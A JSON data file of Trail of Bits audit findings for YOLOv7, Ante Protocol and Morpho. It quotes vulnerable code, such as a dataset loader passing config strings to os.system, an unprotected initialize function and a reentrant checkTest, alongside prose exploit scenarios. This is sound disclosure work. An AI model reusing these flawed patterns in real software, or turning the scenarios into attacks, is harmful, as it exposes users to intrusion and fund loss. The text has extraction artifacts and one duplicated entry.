        "body": "Currently, the YOLOv7 codebase does not contain any form of testing framework. The only testing of the codebase is performed on the model itself via the typical training and testing that is performed on machine learning models. Notably, there are no other units or integration tests in the codebase. Unit tests help expose errors and help provide additional documentation or understanding of the codebase to readers. Moreover, they exercise code in a more systematic way than any human can. A strong suite of unit tests is essential to protect against codebase regressions. A stronger testing suite could have prevented the occurrence of multiple issues in this report, such as TOB-YOLO9, and there are likely other issues in the codebase that could be uncovered by a stronger test suite. At a minimum, unit tests covering both the happy and sad paths should be added for all critical functions, especially those that accept input from potentially external sources. Ideally, this test suite could be extended to include the entire codebase and also include integration tests that test the interaction between multiple components (again, especially if these components interact with external input). Exploit Scenario A security-critical system relies on YOLOv7 for real-time object detection. A malicious actor closely monitors the system and the YOLOv7 codebase. Due to a lack of a testing framework that prevents code regressions, an old, critical aw is reintroduced into the codebase in a recent commit to the YOLOv7 codebase. The malicious actor identies this aw and exploits the security-critical system using this vulnerability. Recommendations Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. The check_dataset function downloads and unzips les from arbitrary URLs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The check_dataset function is used throughout the codebase to see if a dataset exists at a particular directory path; if the dataset does not exist, then the check_dataset function attempts to download the dataset by either downloading a zip le or running a bash script specied in the input. 156 157 158 159 160 def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path 161 162 if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) 163 164 165 166 167 168 unzip 169 170 171 if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL # filename f = Path(s).name torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value 172 173 else: raise Exception('Dataset not found.') Figure 8.1: check_dataset function downloads and unzips from arbitrary URLs This could be highly problematic in some instances. For example, in the test.py le, this function is called on the data variable that is obtained from reading a YAML le that is specied via a command line argument. If this YAML le is corrupted, an attacker could inject a URL that will result in the target user unzipping a zip bomb that halts execution of the model. Exploit Scenario A malicious actor corrupts the dataset YAML le being used by a target user during training and injects a malicious download URL. The target user does not inspect their YAML les closely and unknowingly downloads and unzips a zip bomb that halts execution of their model. Recommendations Short term, validate the zip le before unzipping to prevent a zip bomb attack. For example, check the size of the le and do not unzip it if it is too large. Long term, limit which URLs users can download les from or carefully verify that downloaded les can be trusted before unzipping them.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Insu\u0000cient input validation in triton inference server could result in uncaught exception at runtime ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The triton inference server is an open source software that streamlines AI inference. The triton inference server component of the YOLOv7 codebase includes logic for deploying YOLOv7 to the triton inference server. The client.py le implements a command line interface for interacting with YOLO models deployed on triton; for example, using this command line interface, users can pass in images and videos to be evaluated. Despite this command line interface accepting images and videos from potentially external, untrusted sources, very limited input validation is performed on these inputs. As a result, several crafted inputs could cause execution to halt due to uncaught exceptions or other errors. One such example is shown in gure 9.1, where both the preprocess and postprocess functions (both of which are called in client.py) have multiple locations where a division-by-zero error could occur. 6 7 8 9 10 11 12 13 14 15 16 17 18 def preprocess(img, input_shape, letter_box=True): if letter_box: img_h, img_w, _ = img.shape new_h, new_w = input_shape[0], input_shape[1] offset_h, offset_w = 0, 0 if (new_w / img_w) <= (new_h / img_h): new_h = int(img_h * new_w / img_w) offset_h = (input_shape[0] - new_h) // 2 else: new_w = int(img_w * new_h / img_h) offset_w = (input_shape[1] - new_w) // 2 resized = cv2.resize(img, (new_w, new_h)) img = np.full((input_shape[0], input_shape[1], 3), 127, dtype=np.uint8) 19 resized 20 21 22 23 24 25 img[offset_h:(offset_h + new_h), offset_w:(offset_w + new_w), :] = else: img = cv2.resize(img, (input_shape[1], input_shape[0])) img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) img = img.transpose((2, 0, 1)).astype(np.float32) img /= 255. 26 27 28 return img def postprocess(num_dets, det_boxes, det_scores, det_classes, img_w, img_h, input_shape, letter_box=True): 29 boxes = det_boxes[0, :num_dets[0][0]] / np.array([input_shape[0], input_shape[1], input_shape[0], input_shape[1]], dtype=np.float32) 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 scores = det_scores[0, :num_dets[0][0]] classes = det_classes[0, :num_dets[0][0]].astype(np.int) old_h, old_w = img_h, img_w offset_h, offset_w = 0, 0 if letter_box: if (img_w / input_shape[1]) >= (img_h / input_shape[0]): old_h = int(input_shape[0] * img_w / input_shape[1]) offset_h = (old_h - img_h) // 2 else: old_w = int(input_shape[1] * img_h / input_shape[0]) offset_w = (old_w - img_w) // 2 boxes = boxes * np.array([old_w, old_h, old_w, old_h], dtype=np.float32) if letter_box: boxes -= np.array([offset_w, offset_h, offset_w, offset_h], dtype=np.float32) 46 47 48 49 50 boxes = boxes.astype(np.int) detected_objects = [] for box, score, label in zip(boxes, scores, classes): detected_objects.append(BoundingBox(label, score, box[0], box[2], box[1], box[3], img_w, img_h)) 51 return detected_objects Figure 9.1: preprocess and postprocess functions do not validate inputs and could trigger division-by-zero errors. A comprehensive suite of unit tests, covering both the happy and sad codepaths, could help to identify and resolve issues like this. Without any existing unit tests in the triton inference code, it is likely that other crafted input values could result in halting the execution of the inference, or potentially even more severe results. Exploit Scenario A malicious actor targets a system using YOLOv7 deployed on triton in which high availability is essential, such as an autonomous vehicle system. An attacker discovers these implementation aws and causes execution to halt by passing in malformed images, which will result in a division-by-zero error occurring during either pre-processing or post-processing. The system experiences a denial of service. Recommendations Short term, update preprocess, postprocess, and client.py to properly handle inputs that currently cause a division-by-zero error to occur. Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Improper use of TorchScript tracing leads to model di\u0000erentials ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "To facilitate deployment, Pytorch oers torch.jit.trace to convert models into the TorchScript format. However, as shown in table 10.1, there are many known cases in which tracing does not lead to an accurate representation. Tracer Edge Cases Example Input-dependent control ow (including mutable container types and in-place operations) Lines 34,35,37,40,and 51 of models/yolo.py Certain tensor operations from external libraries and implicit type conversions with tensors Lines 50-59 of models/experimental.py Table 10.1: Edge cases in which tracing does not produce accurate representation These cases are present in the dened YOLOv7 models that are currently being traced . This means that the deployed model is dierent from the original model, yielding dierent results. In addition, in this codebase, tracing is performed after the model is serialized to a PyTorch le and then deserialized. This practice, in conjunction with the non-standard structure of the model architecture code, results in the loss of information that analyzes the veracity of training, such as tracer warnings indicating the presence of edge cases. 362 traced_script_module = torch.jit.trace(self.model, rand_example, strict=False) Figure 10.1: Improper use of TorchScript tracing (yolov7/utils/torch_utils.py#362) This use of tracing could introduce dierentials that enable the creation of backdoors. For instance, an attacker could craft a malicious model that behaves dierently when deployed. Specically, this attacker could introduce a backdoor of custom logic that executes only on deployed models. Exploit Scenario An attacker trains a model that exhibits a specic, potentially malicious behavior when deployed that is not present otherwise. Specically, the attacker creates a model that has special behavior for specic input images. Since this behavior is present only for specic images and only during deployment, detecting this backdoored behavior is dicult. Recommendations Short-term, mix both tracing and scripting of the model to ensure that all tracing edge cases are avoided. It would also be useful to minimize edge cases, especially those indicated by tracer warnings, to reduce the possibility of dierentials. The integrity and eectiveness of tracing should also be tested before serialization by using the automatic trace checker. Long-term, use torch.compile instead of tracing and scripting, as it minimizes the presence of dierentials.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Flaw in detect.py will cause runtime exceptions to occur when using a traced model ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf",
        "body": "The detect.py le provides command-line arguments for using the trained YOLO models. These command-line arguments include --img-size and --no-trace. The former argument controls the size of the image being sent to the model, and the latter controls whether or not a traced model is used. The function check_img_size() updates the size of the image (if it is invalid) using the variable imgz. However, when the model is traced, the original input size is passed to the model instead of the updated size. This results in a runtime error when an invalid image size is passed when the model is traced that is not present otherwise. 34 35 36 37 38 model = attempt_load(weights, map_location=device) # load FP32 model stride = int(model.stride.max()) imgsz = check_img_size(imgsz, s=stride) # check img_size if trace: # model stride model = TracedModel(model, device, opt.img_size) Figure 12.1: Potential runtime exception in detect.py#L38 Exploit Scenario A malicious actor targets a system using YOLO in which high availability is essential, such as an autonomous vehicle system. An attacker discovers that this implementation aw exists in the version of YOLO being run in the system and causes the target system to attempt to trace a model with invalid image size. Due to this implementation aw, execution halts and the system experiences a denial of service. Recommendations Short term, adjust detect.py to resolve this implementation aw and allow tracing to occur with the proper image size. Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. AntePoolFactory does not validate create2 return addresses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "The AntePoolFactory uses the create2 instruction to deploy an AntePool and then initializes it with an already-deployed AnteTest address. However, the AntePoolFactory does not validate the address returned by create2, which will be the zero address if the deployment operation fails. bytes memory bytecode = type(AntePool).creationCode; bytes32 salt = keccak256(abi.encodePacked(testAddr)); assembly { testPool := create2(0, add(bytecode, 0x20), mload(bytecode), salt) } poolMap[testAddr] = testPool; allPools.push(testPool); AntePool(testPool).initialize(anteTest); emit AntePoolCreated(testAddr, testPool); Figure 1.1: contracts/AntePoolFactory.sol#L35-L47 This lack of validation does not currently pose a problem, because the simplicity of AntePool contracts helps prevent deployment failures (and thus the return of the zero address). However, deployment issues could become more likely in future iterations of the Ante Protocol. Recommendations Short term, have the AntePoolFactory check the address returned by the create2 operation against the zero address. Long term, ensure that the results of operations that return a zero address in the event of a failure (such as create2 and ecrecover operations) are validated appropriately.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Events emitted during critical operations omit certain details ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure. 3. Insu\u0000cient gas can cause AnteTests to produce false positives Severity: High Diculty: High Type: Data Validation Finding ID: TOB-ANTE-3 Target: contracts/AntePool.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. Looping over an array of unbounded size can cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "If an AnteTest fails, the _checkTestNoRevert function will return false, causing the checkTest function to call _calculateChallengerEligibility to compute eligibleAmount; this value is the total stake of the eligible challengers and is used to calculate the proportion of _remainingStake owed to each challenger. To calculate eligibleAmount, the _calculateChallengerEligibility function loops through an unbounded array of challenger addresses. When the number of challengers is large, the function will consume a large quantity of gas in this operation. function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 4.1: contracts/AntePool.sol#L553-L563 However, triggering an out-of-gas error would be costly to an attacker; the attacker would need to create many accounts through which to stake funds, and the amount of each stake would decay over time. Exploit Scenario The length of the challenger address array grows such that the computation of the eligibleAmount causes the block to reach its gas limit. Then, because of this Ethereum-imposed gas constraint, the entire transaction reverts, and the failing AnteTest is not marked as failing. As a result, challengers who have staked funds in anticipation of a failed test will not receive a payout. Recommendations Short term, determine the number of challengers that can enter an AntePool without rendering the _calculateChallengerEligibility functions operation too gas intensive; then, use that number as the upper limit on the number of challengers. Long term, avoid calculating every challengers proportion of _remainingStake in the same operation; instead, calculate each user's pro-rata share when he or she enters the pool and modify the challenger delay to require that a challenger register and wait 12 blocks before minting his or her pro-rata share. Upon a test failure, a challenger would burn these shares and redeem them for ether.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Events emitted during critical operations omit certain details ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. Insu\u0000cient gas can cause AnteTests to produce false positives ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "Once challengers have staked ether and the challenger delay has passed, they can submit transactions to predict that a test will fail and to earn a bonus if it does. An attacker could manipulate the result of an AnteTest by providing a limited amount of gas to the checkTest function, forcing the test to fail. This is because the anteTest.checkTestPasses function receives 63/64 of the gas provided to checkTest (per the 63/64 gas forwarding rule), which may not be enough. This issue stems from the use of a try-catch statement in the _checkTestNoRevert function, which causes the function to return false when an EVM exception occurs, indicating a test failure. We set the diculty of this nding to high, as the outer call will also revert with an out-of-gas exception if it requires more than 1/64 of the gas; however, other factors (e.g., the block gas limit) may change in the future, allowing for a successful exploitation. if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); Figure 3.1: Part of the checkTest function /// @return passes bool if the Ante Test passed function _checkTestNoRevert() internal returns (bool) { try anteTest.checkTestPasses() returns (bool passes) { return passes; } catch { return false; } } Figure 3.2: contracts/AntePool.sol#L567-L573 Exploit Scenario An attacker calculates the amount of gas required for checkTest to run out of gas in the inner call to anteTest.checkTestPasses. The test fails, and the attacker claims the verier bonus. Recommendations Short term, ensure that the AntePool reverts if the underlying AnteTest does not have enough gas to return a meaningful value. Long term, redesign the test verication mechanism such that gas usage does not cause false positives.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Reentrancy into AntePool.checkTest scales challenger eligibility amount ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf",
        "body": "A malicious AnteTest or underlying contract being tested can trigger multiple failed checkTest calls by reentering the AntePool.checkTest function. With each call, the _calculateChallengerEligibility method increases the eligibleAmount instead of resetting it, causing the eligibleAmount to scale unexpectedly with each reentrancy. function checkTest() external override testNotFailed { require(challengers.exists(msg.sender), \"ANTE: Only challengers can checkTest\"); require( block.number.sub(eligibilityInfo.lastStakedBlock[msg.sender]) > CHALLENGER_BLOCK_DELAY, \"ANTE: must wait 12 blocks after challenging to call checkTest\" ); numTimesVerified = numTimesVerified.add(1); lastVerifiedBlock = block.number; emit TestChecked(msg.sender); if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); emit FailureOccurred(msg.sender); } } Figure 5.1: contracts/AntePool.sol#L292-L316 function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 5.2: contracts/AntePool.sol#L553-L563 Appendix D includes a proof-of-concept AnteTest contract and hardhat unit test that demonstrate this issue. Exploit Scenario An attacker deploys an AnteTest contract or a vulnerable contract to be tested. The attacker directs the deployed contract to call AntePool.stake, which registers the contract as a challenger. The malicious contract then reenters AntePool.checkTest and triggers multiple failures within the same call stack. As a result, the AntePool makes multiple calls to the _calculateChallengerEligibility method, which increases the challenger eligibility amount with each call. This results in a greater-than-expected loss of pool funds. Recommendations Short term, implement checks to ensure the AntePool contracts methods cannot be reentered while checkTest is executing. Long term, ensure that all calls to external contracts are reviewed for reentrancy risks. To prevent a reentrancy from causing undened behavior in the system, ensure state variables are updated in the appropriate order; alternatively (and if sensible) disallow reentrancy altogether. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "The owner of the IncentivesVault contract and other Ownable Morpho contracts can be changed by calling the transferOwnership function. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. 13 contract IncentivesVault is IIncentivesVault, Ownable { Figure 1.1: Inheritance of contracts/compound/IncentivesVault.sol 62 function transferOwnership(address newOwner) public virtual onlyOwner { 63 64 65 } require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); Figure 1.2: The transferOwnership function in @openzeppelin/contracts/access/Ownable.sol Exploit Scenario Bob, the IncentivesVault owner, invokes transferOwnership() to change the contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, for contract ownership transfers, implement a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Incomplete information provided in Withdrawn and Repaid events ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "The core operations in the PositionsManager contract emit events with parameters that provide information about the operations actions. However, two events, Withdrawn and Repaid, do not provide complete information. For example, the withdrawLogic function, which performs withdrawals, takes a _supplier address (the user supplying the tokens) and _receiver address (the user receiving the tokens): /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external Figure 2.1: The function signature of PositionsManagers withdrawLogic function However, the corresponding event in _safeWithdrawLogic records only the msg.sender of the transaction, so the _supplier and _receiver involved in the transaction are unclear. Moreover, if a withdrawal is performed as part of a liquidation operation, three separate addresses may be involvedthe _supplier, the _receiver, and the _user who triggered the liquidationand those monitoring events will have to cross-reference multiple events to understand whose tokens moved where. /// @notice Emitted when a withdrawal happens. /// @param _user The address of the withdrawer. /// @param _poolTokenAddress The address of the market from where assets are withdrawn. /// @param _amount The amount of assets withdrawn (in underlying). /// @param _balanceOnPool The supply balance on pool after update. /// @param _balanceInP2P The supply balance in peer-to-peer after update. event Withdrawn( address indexed _user,  Figure 2.2: The declaration of the Withdrawn event in PositionsManager emit Withdrawn( msg.sender, _poolTokenAddress, _amount, supplyBalanceInOf[_poolTokenAddress][msg.sender].onPool, supplyBalanceInOf[_poolTokenAddress][msg.sender].inP2P ); Figure 2.3: The emission of the Withdrawn event in the _safeWithdrawLogic function A similar issue is present in the _safeRepayLogic functions Repaid event. Recommendations Short term, add the relevant addresses to the Withdrawn and Repaid events. Long term, review all of the events emitted by the system to ensure that they emit sucient information.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing access control check in withdrawLogic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "The PositionsManager contracts withdrawLogic function does not perform any access control checks. In practice, this issue is not exploitable, as all interactions with this contract will be through delegatecalls with a hard-coded msg.sender sent from the main Morpho contract. However, if this code is ever reused or if the architecture of the system is ever modied, this guarantee may no longer hold, and users without the proper access may be able to withdraw funds. /// @dev Implements withdraw logic with security checks. /// @param _poolTokenAddress The address of the market the user wants to interact with. /// @param _amount The amount of token (in underlying). /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external { Figure 3.1: The withdrawLogic function, which takes a supplier and whose comments note that it performs security checks Recommendations Short term, add a check to the withdrawLogic function to ensure that it withdraws funds only from the msg.sender. Long term, implement security checks consistently throughout the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Lack of zero address checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. A mistake like this could initially go unnoticed because a delegatecall to an address without code will return success. /// @notice Sets the `positionsManager`. /// @param _positionsManager The new `positionsManager`. function setPositionsManager(IPositionsManager _positionsManager) external onlyOwner { positionsManager = _positionsManager; emit PositionsManagerSet(address(_positionsManager)); } Figure 4.1: An important address setter in MorphoGovernance Exploit Scenario Alice and Bob control a multisignature wallet that is the owner of a deployed Morpho contract. They decide to set _positionsManager to a newly upgraded contract but, while invoking setPositionsManager, they mistakenly omit the address. As a result, _positionsManager is set to the zero address, resulting in undened behavior. Recommendations Short term, add zero-value checks to all important address setters to ensure that owners cannot accidentally set addresses to incorrect values, misconguring the system. Specically, add zero-value checks to the setPositionsManager, setRewardsManager, setInterestRates, setTreasuryVault, and setIncentivesVault functions, as well as the _cETH and _cWeth parameters of the initialize function in the MorphoGovernance contract. Long term, incorporate Slither into a continuous integration pipeline, which will continuously warn developers when functions do not have checks for zero values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Risky use of toggle functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "The codebase uses a toggle function, togglePauseStatus, to pause and unpause a market. This function is error-prone because setting a pause status on a market depends on the markets current state. Multiple uncoordinated pauses could result in a failure to pause a market in the event of an incident. /// @notice Toggles the pause status on a specific market in case of emergency. /// @param _poolTokenAddress The address of the market to pause/unpause. function togglePauseStatus(address _poolTokenAddress) external onlyOwner isMarketCreated(_poolTokenAddress) { } Types.MarketStatus storage marketStatus_ = marketStatus[_poolTokenAddress]; bool newPauseStatus = !marketStatus_.isPaused; marketStatus_.isPaused = newPauseStatus; emit PauseStatusChanged(_poolTokenAddress, newPauseStatus); Figure 5.1: The togglePauseStatus method in MorphoGovernance This issue also applies to togglePartialPauseStatus, toggleP2P, and toggleCompRewardsActivation in MorphoGovernance and to togglePauseStatus in IncentivesVault. Exploit Scenario All signers of a 4-of-9 multisignature wallet that owns a Morpho contract notice an ongoing attack that is draining user funds from the protocol. Two groups of four signers hurry to independently call togglePauseStatus, resulting in a failure to pause the system and leading to the further loss of funds. Recommendations Short term, replace the toggle functions with ones that explicitly set the pause status to true or false. Long term, carefully review the incident response plan and ensure that it leaves as little room for mistakes as possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Anyone can destroy Morphos implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "An incorrect access control on the initialize function for Morphos implementation contract allows anyone to destroy the contract. Morpho uses the delegatecall proxy pattern for upgradeability: abstract contract MorphoStorage is OwnableUpgradeable, ReentrancyGuardUpgradeable { Figure 6.1: contracts/compound/MorphoStorage.sol#L16 With this pattern, a proxy contract is deployed and executes a delegatecall to the implementation contract for certain operations. Users are expected to interact with the system through this proxy. However, anyone can also directly call Morphos implementation contract. Despite the use of the proxy pattern, the implementation contract itself also has delegatecall capacities. For example, when called in the updateP2PIndexes function, setReserveFactor executes a delegatecall on user-provided addresses: function setReserveFactor(address _poolTokenAddress, uint16 _newReserveFactor) external onlyOwner isMarketCreated(_poolTokenAddress) { if (_newReserveFactor > MAX_BASIS_POINTS) revert ExceedsMaxBasisPoints(); updateP2PIndexes(_poolTokenAddress); Figure 6.2: contracts/compound/MorphoGovernance.sol#L203-L209 function updateP2PIndexes(address _poolTokenAddress) public { address(interestRatesManager).functionDelegateCall( abi.encodeWithSelector( interestRatesManager.updateP2PIndexes.selector, _poolTokenAddress ) ); } Figure 6.3: contracts/compound/MorphoUtils.sol#L119-L126 These functions are protected by the onlyOwner modier; however, the systems owner is set by the initialize function, which is callable by anyone: function initialize( IPositionsManager _positionsManager, IInterestRatesManager _interestRatesManager, IComptroller _comptroller, Types.MaxGasForMatching memory _defaultMaxGasForMatching, uint256 _dustThreshold, uint256 _maxSortedUsers, address _cEth, address _wEth ) external initializer { __ReentrancyGuard_init(); __Ownable_init(); Figure 6.4: contracts/compound/MorphoGovernance.sol#L114-L125 As a result, anyone can call Morpho.initialize to become the owner of the implementation and execute any delegatecall from the implementation, including to a contract containing a selfdestruct. Doing so will cause the proxy to point to a contract that has been destroyed. This issue is also present in PositionsManagerForAave. Exploit Scenario The system is deployed. Eve calls Morpho.initialize on the implementation and then calls setReserveFactor, triggering a delegatecall to an attacker-controlled contract that self-destructs. As a result, the system stops working. Recommendations Short term, add a constructor in MorphoStorage and PositionsManagerForAaveStorage that will set an is_implementation variable to true and check that this variable is false before executing any critical operation (such as initialize, delegatecall, and selfdestruct). By setting this variable in the constructor, it will be set only in the implementation and not in the proxy. Long term, carefully review the pitfalls of using the delegatecall proxy pattern. References  Breaking Aave Upgradeability",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Lack of return value checks during token transfers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
        "body": "In certain parts of the codebase, contracts that execute transfers of the Morpho token do not check the values returned from those transfers. The development of the Morpho token was not yet complete at the time of the audit, so we were unable to review the code specic to the Morpho token. Some tokens that are not ERC20 compliant return false instead of reverting, so failure to check such return values could result in undened behavior, including the loss of funds. If the Morpho token adheres to ERC20 standards, then this issue may not pose a risk; however, due to the lack of return value checks, the possibility of undened behavior cannot be eliminated. function transferMorphoTokensToDao(uint256 _amount) external onlyOwner { morphoToken.transfer(morphoDao, _amount); emit MorphoTokensTransferred(_amount); } Figure 7.1: The transerMorphoTokensToDao method in IncentivesVault Exploit Scenario The Morpho token code is completed and deployed alongside the other Morpho system components. It is implemented in such a way that it returns false instead of reverting when transfers fail, leading to undened behavior. Recommendations Short term, consider using a safeTransfer library for all token transfers. Long term, review the token integration checklist and check all the components of the system to ensure that they interact with tokens safely.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Risk of loss of precision in division operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf",
